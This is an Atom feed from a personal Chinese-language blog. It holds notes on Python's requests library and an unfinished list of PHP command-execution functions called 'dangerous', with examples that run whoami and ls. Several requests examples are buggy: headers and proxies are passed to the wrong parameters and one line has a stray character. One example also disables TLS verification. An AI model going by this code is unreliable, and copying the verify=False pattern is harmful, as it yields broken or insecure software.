<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>blog</title>
  
  <subtitle>Sinevil</subtitle>
  <link href="https://sinevil.github.io/atom.xml" rel="self"/>
  
  <link href="https://sinevil.github.io/"/>
  <updated>2021-08-12T11:29:08.314Z</updated>
  <id>https://sinevil.github.io/</id>
  
  <author>
    <name>Mr.Li</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Python的requests模块（持续）</title>
    <link href="https://sinevil.github.io/2021/08/12/requests/"/>
    <id>https://sinevil.github.io/2021/08/12/requests/</id>
    <published>2021-08-12T08:28:05.000Z</published>
    <updated>2021-08-12T11:29:08.314Z</updated>
    
    <content type="html"><![CDATA[<p><strong>python的requests模块</strong></p><p><strong>requset模块</strong></p><p>requests模块是python中常用的写网页爬虫程序的包，requests可以发送HTTP请求，并获取请求状态及请求内容，也可以用来做接口自动化测试</p><p><strong>功能</strong></p><ul><li>获取网站信息</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">response = requests.get(<span class="string">&#x27;http://www.baidu.com&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(response))<span class="comment">#返回值的类型</span></span><br><span class="line"><span class="built_in">print</span>(response.status_code)<span class="comment">#当前网站返回的状态码</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(response.text))<span class="comment">#网页内容的类型</span></span><br><span class="line"><span class="built_in">print</span>(response.text)<span class="comment">#网页的具体内容（html代码）</span></span><br><span class="line"><span class="built_in">print</span>(response.cookies)<span class="comment">#网页的cookie</span></span><br><span class="line"><span class="built_in">print</span>(response.headers)<span class="comment">#网站的请求头</span></span><br><span class="line"><span class="built_in">print</span>(response.history)<span class="comment">#网站的历史记录</span></span><br></pre></td></tr></table></figure><ul><li>各种请求方式</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">response = requests.get(<span class="string">&#x27;http://httpbin.org/get&#x27;</span>) </span><br><span class="line">requests.post(<span class="string">&#x27;http://www.baidu.com/post&#x27;</span>)</span><br><span class="line">requests.delete(<span class="string">&#x27;http://www.baidu.com/delete&#x27;</span>)</span><br><span class="line">requests.put(<span class="string">&#x27;http://www.baidu.com/put&#x27;</span>)</span><br><span class="line">requests.head(<span class="string">&#x27;http://www.baidu.com/get&#x27;</span>)</span><br><span class="line">requests.options(<span class="string">&#x27;http://www.baidu.com/get&#x27;</span>)</span><br></pre></td></tr></table></figure><ul><li>GET请求</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#增加参数</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">response = requests.get(<span class="string">&#x27;http://httpbin.org/get?name=germey&amp;age=22&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br><span class="line"></span><br><span class="line"><span class="comment">#构造payload</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;germey&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;age&#x27;</span>:<span class="string">&#x27;22&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">response = requests.get(<span class="string">&#x27;http://httpbin.org/get&#x27;</span>,params=data)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br><span class="line"></span><br><span class="line"><span class="comment">#解析json</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">response = requests.get(<span class="string">&#x27;http://httpbin.org/get&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(response.text))</span><br><span class="line"><span class="built_in">print</span>(response.json())</span><br><span class="line"><span class="built_in">print</span>(json.loads(response.text))</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(response.json()))</span><br><span class="line"></span><br><span class="line"><span class="comment">#获取二进制数据</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">response = requests.get(<span class="string">&quot;https://github.com/favicon.ico&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(response.text),<span class="built_in">type</span>(response.content))</span><br><span class="line"><span class="built_in">print</span>(response.text)i</span><br><span class="line"><span class="built_in">print</span>(response.content)</span><br><span class="line"></span><br><span class="line"><span class="comment">#获取照片</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">response = requests.get(<span class="string">&quot;https://github.com/favicon.ico&quot;</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;facicon.ico&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(response.content)</span><br><span class="line">    f.close()</span><br><span class="line"></span><br><span class="line"><span class="comment">#添加headers，爬虫</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;https://www.zhihu.com/explore&#x27;</span></span><br><span class="line">headers = &#123;</span><br><span class="line"><span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Host&#x27;</span>:<span class="string">&#x27;httpbin.org&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">response = requests.get(url,headers)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure><ul><li>POST请求</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#基本的POST请求</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;germey&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;age&#x27;</span>:<span class="string">&#x27;22&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">headers = &#123;</span><br><span class="line"><span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Host&#x27;</span>:<span class="string">&#x27;httpbin.org&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">url = <span class="string">&#x27;http://httpbin.org/post&#x27;</span></span><br><span class="line">response = requests.post(url,data,headers)</span><br><span class="line"><span class="built_in">print</span>(response.json())</span><br><span class="line"></span><br><span class="line"><span class="comment">#response属性</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">response = requests.get(<span class="string">&#x27;http://www.jianshu.com&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(response.status_code), response.status_code)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(response.headers), response.headers)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(response.cookies), response.cookies)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(response.url), response.url)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(response.history), response.history)</span><br><span class="line"></span><br><span class="line"><span class="comment">#状态码的判断</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">response = requests.get(<span class="string">&#x27;http://www.jianshu.com&#x27;</span>)</span><br><span class="line">exit()<span class="keyword">if</span> <span class="keyword">not</span> response.status_code ==requests.codes.ok <span class="keyword">else</span> <span class="built_in">print</span>(<span class="string">&#x27;成功访问&#x27;</span>)</span><br></pre></td></tr></table></figure><ul><li>其他操作</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#文件上传</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">file = &#123;</span><br><span class="line">    <span class="string">&#x27;file&#x27;</span>:<span class="built_in">open</span>(<span class="string">&#x27;文件名称&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line">response = requests.post(<span class="string">&quot;网址&quot;</span>,file)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br><span class="line"></span><br><span class="line"><span class="comment">#获取cookie</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">response = requests.get(<span class="string">&#x27;https://www.baidu.com&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(response.cookies)</span><br><span class="line"><span class="keyword">for</span> key,value <span class="keyword">in</span> response.cookies.items():</span><br><span class="line">    <span class="built_in">print</span>(key+<span class="string">&quot;=&quot;</span>+value)</span><br><span class="line"></span><br><span class="line"><span class="comment">#session维持</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">s = requests.Session()</span><br><span class="line">s.get(<span class="string">&#x27;http://httpbin.org/cookies/set/number/123456789&#x27;</span>)</span><br><span class="line">response = s.get(<span class="string">&#x27;http://httpbin.org/cookies&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br><span class="line"></span><br><span class="line"><span class="comment">#证书检测（待续）</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">response = requests.get(<span class="string">&#x27;https://www.12306.cn&#x27;</span>,verify = <span class="literal">False</span>)</span><br><span class="line"><span class="built_in">print</span>(response.status_code)</span><br><span class="line"></span><br><span class="line"><span class="comment">#代理设置（待续）</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">proxys = (&#123;</span><br><span class="line">    <span class="string">&#x27;http&#x27;</span>:<span class="string">&#x27;http://127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;https&#x27;</span>:<span class="string">&#x27;https://127.0.0.1&#x27;</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">response = requests.get(<span class="string">&#x27;http://www.baidu.com&#x27;</span>,proxys)</span><br><span class="line"><span class="built_in">print</span>(response.status_code)</span><br><span class="line"></span><br><span class="line"><span class="comment">#超时设置（Timeout参数设置超时时间）</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> requests.exceptions <span class="keyword">import</span> ReadTimeout</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    response = requests.get(<span class="string">&#x27;http://www.baidu.com&#x27;</span>,timeout =<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(response.status_code)</span><br><span class="line"><span class="keyword">except</span> ReadTimeout:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Timeout&#x27;</span>)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;python的requests模块&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;requset模块&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;requests模块是python中常用的写网页爬虫程序的包，requests可以发送HTTP请求，并获取请求状态及请求内</summary>
      
    
    
    
    <category term="语言" scheme="https://sinevil.github.io/categories/%E8%AF%AD%E8%A8%80/"/>
    
    
    <category term="Python" scheme="https://sinevil.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>php常见危险函数（持续）</title>
    <link href="https://sinevil.github.io/2021/08/08/phpweixian/"/>
    <id>https://sinevil.github.io/2021/08/08/phpweixian/</id>
    <published>2021-08-08T11:12:26.000Z</published>
    <updated>2021-08-12T03:39:23.450Z</updated>
    
    <content type="html"><![CDATA[<p><strong>php常见危险函数</strong></p><ul><li>phpinfo()</li></ul><p>输出 PHP 当前状态的大量信息，包含了 PHP 编译选项、启用的扩展、PHP 版本、服务器信息和环境变量（如果编译为一个模块的话）、PHP环境变量、操作系统版本信息、path 变量、配置选项的本地值和主值、HTTP 头和PHP授权信息(License)。</p><p><strong>exec</strong></p><ul><li><p>用法：</p><p>执行一个外部程序</p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec ( <span class="keyword">string</span> <span class="variable">$command</span> [, <span class="keyword">array</span> &amp;<span class="variable">$output</span> [, <span class="keyword">int</span> &amp;<span class="variable">$return_var</span> ]] ) : <span class="keyword">string</span></span><br></pre></td></tr></table></figure><ul><li>参数</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">command</span>    <span class="comment">#要执行的命令。</span></span><br><span class="line"></span><br><span class="line">output    <span class="comment">#如果提供了 output 参数， 那么会用命令执行的输出填充此数组， 每行输出填充数组中的一个元素。 数组中的数据不包含行尾的空白字符，例如 \n 字符。 请注意，如果数组中已经包含了部分元素，exec() 函数会在数组末尾追加内容。如果你不想在数组末尾进行追加， 请在传入 exec() 函数之前 对数组使用 unset() 函数进行重置。</span></span><br><span class="line"></span><br><span class="line">return_var   <span class="comment">#如果同时提供 output 和 return_var 参数， 命令执行后的返回状态会被写入到此变量。</span></span><br></pre></td></tr></table></figure><ul><li>返回值<br>命令执行结果的最后一行内容。 如果你需要获取未经处理的全部输出数据， 请使用 passthru() 函数。</li></ul><p>如果想要获取命令的输出内容， 请确保使用 output 参数。</p><ul><li>示例</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="comment">// 输出运行中的 php/httpd 进程的创建者用户名</span></span><br><span class="line">  <span class="comment">// （在可以执行 &quot;whoami&quot; 命令的系统上）</span></span><br><span class="line">  <span class="keyword">echo</span> exec(<span class="string">&#x27;whoami&#x27;</span>);</span><br><span class="line">  <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>system</strong></p><ul><li><p>用法：</p><p>执行外部程序，并且显示输出</p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system ( <span class="keyword">string</span> <span class="variable">$command</span> [, <span class="keyword">int</span> &amp;<span class="variable">$return_var</span> ] ) : <span class="keyword">string</span></span><br></pre></td></tr></table></figure><p>同 C 版本的 system() 函数一样， 本函数执行 command 参数所指定的命令， 并且输出执行结果。</p><p>如果 PHP 运行在服务器模块中， system() 函数还会尝试在每行输出完毕之后， 自动刷新 web 服务器的输出缓存。</p><p>如果要获取一个命令未经任何处理的 原始输出， 请使用 passthru() 函数。</p><ul><li>参数</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">command</span><span class="comment">#要执行的命令。</span></span><br><span class="line"></span><br><span class="line">return_var<span class="comment">#如果提供 return_var 参数， 则外部命令执行后的返回状态将会被设置到此变量中。</span></span><br></pre></td></tr></table></figure><ul><li><p>返回值<br>成功则返回命令输出的最后一行， 失败则返回 FALSE</p></li><li><p>示例</p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line"><span class="comment">// 输出 shell 命令 &quot;ls&quot; 的返回结果</span></span><br><span class="line"><span class="comment">// 并且将输出的最后一样内容返回到 $last_line。</span></span><br><span class="line"><span class="comment">// 将命令的返回值保存到 $retval。</span></span><br><span class="line"><span class="variable">$last_line</span> = system(<span class="string">&#x27;ls&#x27;</span>, <span class="variable">$retval</span>);</span><br><span class="line"><span class="comment">// 打印更多信息</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;</span></span><br><span class="line"><span class="string">&lt;/pre&gt;</span></span><br><span class="line"><span class="string">&lt;hr /&gt;Last line of the output: &#x27;</span> . <span class="variable">$last_line</span> . <span class="string">&#x27;</span></span><br><span class="line"><span class="string">&lt;hr /&gt;Return value: &#x27;</span> . <span class="variable">$retval</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>shell_exec</strong></p><ul><li>用法：</li></ul><p>通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">shell_exec ( <span class="keyword">string</span> <span class="variable">$cmd</span> ) : <span class="keyword">string</span> </span><br><span class="line"></span><br><span class="line">本函数同 `执行操作符`</span><br><span class="line"></span><br><span class="line">&gt; PHP 支持一个执行运算符：反引号（``）。注意这不是单引号！PHP 将尝试将反引号中的内容作为 shell 命令来执行，并将其输出信息返回（即，可以赋给一个变量而不是简单地丢弃到标准输出）。使用反引号运算符“`”的效果与函数 shell_exec() 相同。</span><br><span class="line">&gt;</span><br><span class="line">&gt; <span class="meta">&lt;?php</span></span><br><span class="line">&gt; <span class="variable">$output</span> = `ls -al`;</span><br><span class="line">&gt; <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">$output</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&gt; <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">* 参数</span><br><span class="line"></span><br><span class="line">​```bash</span><br><span class="line">cmd  <span class="comment">#要执行的命令</span></span><br></pre></td></tr></table></figure><ul><li>返回值</li></ul><p>命令执行的输出。 如果执行过程中发生错误或者进程不产生输出，则返回 NULL。</p><p>Note:</p><p>当进程执行过程中发生错误，或者进程不产生输出的情况下，都会返回 NULL， 所以，使用本函数无法通过返回值检测进程是否成功执行。 如果需要检查进程执行的退出码，请使用 exec() 函数。</p><ul><li>示例</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$output</span> = shell_exec(<span class="string">&#x27;ls -lart&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">$output</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>passthru</strong></p><ul><li>用法</li></ul><p>passthru — 执行外部程序并且显示原始输出</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passthru ( <span class="keyword">string</span> <span class="variable">$command</span> [, <span class="keyword">int</span> &amp;<span class="variable">$return_var</span> ] ) : <span class="keyword">void</span></span><br></pre></td></tr></table></figure><p>同 exec() 函数类似， passthru() 函数 也是用来执行外部命令（command）的。 当所执行的 Unix 命令输出二进制数据， 并且需要直接传送到浏览器的时候， 需要用此函数来替代 exec() 或 system() 函数。 常用来执行诸如 pbmplus 之类的可以直接输出图像流的命令。 通过设置 Content-type 为 image/gif， 然后调用 pbmplus 程序输出 gif 文件， 就可以从 PHP 脚本中直接输出图像到浏览器。</p><ul><li>参数</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">command</span><span class="comment">#要执行的命令。</span></span><br><span class="line"></span><br><span class="line">return_var<span class="comment">#如果提供 return_var 参数， Unix 命令的返回状态会被记录到此参数。</span></span><br></pre></td></tr></table></figure><ul><li><p>返回值</p><p>无</p></li></ul><p><strong>popen</strong></p><ul><li>用法</li></ul><p>打开进程文件指针</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">popen ( <span class="keyword">string</span> <span class="variable">$command</span> , <span class="keyword">string</span> <span class="variable">$mode</span> ) : resource</span><br></pre></td></tr></table></figure><p>打开一个指向进程的管道，该进程由派生给定的 command 命令执行而产生。</p><ul><li>参数</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">command</span><span class="comment">#命令</span></span><br><span class="line"></span><br><span class="line">mode<span class="comment">#模式</span></span><br></pre></td></tr></table></figure><ul><li>返回值</li></ul><p>返回一个和 fopen() 所返回的相同的文件指针，只不过它是单向的（只能用于读或写）并且必须用 pclose() 来关闭。此指针可以用于 fgets()，fgetss() 和 fwrite()。 当模式为 ‘r’，返回的文件指针等于命令的 STDOUT，当模式为 ‘w’，返回的文件指针等于命令的 STDIN。</p><p>如果出错返回 FALSE。</p><ul><li>示例</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$handle </span>= popen(<span class="string">&quot;/bin/ls&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#如果未找到要执行的命令，会返回一个合法的资源。这看上去很怪，但有道理。它允许访问 shell 返回的任何错误信息</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(E_ALL);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 加入重定向以得到标准错误输出 stderr。 */</span></span><br><span class="line"><span class="variable">$handle </span>= popen(<span class="string">&#x27;/path/to/executable 2&gt;&amp;1&#x27;</span>, <span class="string">&#x27;r&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&#x27;<span class="subst">$handle</span>&#x27;; &quot;</span> . gettype(<span class="variable">$handle</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="variable">$read </span>= fread(<span class="variable">$handle</span>, <span class="number">2096</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$read</span>;</span><br><span class="line">pclose(<span class="variable">$handle</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>proc_open</strong></p><ul><li>用法</li></ul><p>执行一个命令，并且打开用来输入/输出的文件指针。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proc_open ( <span class="keyword">string</span> <span class="variable">$cmd</span> , <span class="keyword">array</span> <span class="variable">$descriptorspec</span> , <span class="keyword">array</span> &amp;<span class="variable">$pipes</span> [, <span class="keyword">string</span> <span class="variable">$cwd</span> = <span class="literal">NULL</span> [, <span class="keyword">array</span> <span class="variable">$env</span> = <span class="literal">NULL</span> [, <span class="keyword">array</span> <span class="variable">$other_options</span> = <span class="literal">NULL</span> ]]] ) : resource</span><br></pre></td></tr></table></figure><p>类似 popen() 函数， 但是 proc_open() 提供了更加强大的控制程序执行的能力</p><ul><li>参数</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">cmd<span class="comment">#要执行的命令</span></span><br><span class="line"></span><br><span class="line">descriptorspec<span class="comment">#一个索引数组。 数组的键表示描述符，数组元素值表示 PHP 如何将这些描述符传送至子进程。 0 表示标准输入（stdin），1 表示标准输出（stdout），2 表示标准错误（stderr）。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#数组中的元素可以是：</span></span><br><span class="line">包含了要传送至进程的管道的描述信息。 第一个元素为描述符类型， 第二个元素是针对该描述符的选项。 有效的类型有：pipe （第二个元素可以是： r 向进程传送该管道的读取端，w 向进程传送该管道的写入端）， 以及 file（第二个元素为文件名）。</span><br><span class="line">表达一个真实文件描述符的流资源类型 （例如：已打开的文件，一个 socket 端口，STDIN）。</span><br><span class="line">文件描述符的值不限于 0，1 和 2，你可以使用任何有效的文件描述符 并将其传送至子进程。 这使得你的脚本可以和其他脚本交互操作。 